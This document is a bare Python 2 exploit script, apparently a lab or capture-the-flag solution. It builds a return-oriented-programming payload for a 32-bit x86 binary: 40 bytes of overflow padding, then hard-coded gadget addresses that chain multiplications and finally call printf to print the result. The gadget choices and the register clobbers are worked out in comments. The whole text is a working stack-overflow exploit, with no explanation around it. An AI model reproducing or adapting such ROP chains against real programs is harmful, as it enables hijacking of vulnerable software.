#73*21 working in gdb
#21=15 0x80da0d4//7*3
#4=4 0x804804c//2*2, 4
#3=3 0x8048007
#not found 5,

padding="B"*40
dummy_addr="\xef\xbe\xad\xde"
num_5="\x05\x00\x00\x00"

pop_eax="\x9a\xf4\x0c\x08"
pop_ebx="\x1e\x90\x04\x08"#0x0804901e: pop ebx; ret;
pop_ecx="\xf3\x15\x09\x08"

#0x080aeff8: imul dword ptr [ecx]; rcr byte ptr [edi + 0x5e], 1; pop ebx; ret; 
#0x8009eff8-10000
imul_minus_offset="\xf8\xef\x09\x08" #080beff8
offset="\x00\x00\x01\x00" #10000
add_eax_ecx="\x44\x50\x07\x08"
#0x0807949f: mov edx, eax; mov eax, esi; pop esi; pop edi; cmovne eax, edx; ret;
mov_edx_eax="\x9f\x94\x07\x08"+dummy_addr+"\x86\xd3\xff\xff"#valid_dummy_addr
mul_instruction_calc=pop_eax+imul_minus_offset+pop_ecx+offset+add_eax_ecx+mov_edx_eax
#damaged registers eax, ecx, edx, edi, esi
call_mul_edx="\xbd\x96\x04\x08" #0x080496bd: call edx;
#damaged registers edx, ebx
valid_address2="\x03\xd4\xff\xff" #FFFFD406-3=FFFFD403

backup_edx=pop_ebx+valid_address2+"\xf2\x97\x04\x08" #0x080497f2 : mov dword ptr [ebx + 3], edx ; ret
restore_edx=pop_ebx+valid_address2+"\xb6\x97\x04\x08" #0x080497b6 : mov edx, dword ptr [ebx + 3] ; ret

load_ecx_21=pop_ecx+"\xd4\xa0\x0d\x08" #ecx has to be an address
load_5=pop_eax+num_5
mul_21_5=backup_edx+load_ecx_21+load_5+call_mul_edx+restore_edx

load_ecx_4=pop_ecx+"\x4c\x80\x04\x08"
mul_105_4=backup_edx+load_ecx_4+call_mul_edx+restore_edx

mul_420_4=backup_edx+call_mul_edx+restore_edx

load_ecx_3=pop_ecx+"\x07\x80\x04\x08"
mul_1680_3=backup_edx+load_ecx_3+call_mul_edx+restore_edx

#0x08049a9f: pop edi; ret;  "\n%d"
pop_edi="\x9f\x9a\x04\x08"+"\x37\x30\x0d\x08"
#0x080497c4: pop esi; ret; printf address
pop_esi="\xc4\x97\x04\x08"+"\x30\x22\x05\x08"
#0x08079263: push eax; push edi; call esi;
push_para_call_printf=pop_edi+pop_esi+"\x63\x92\x07\x08"

payload=padding+mul_instruction_calc+mul_21_5+mul_105_4+mul_420_4+mul_1680_3+push_para_call_printf

print payload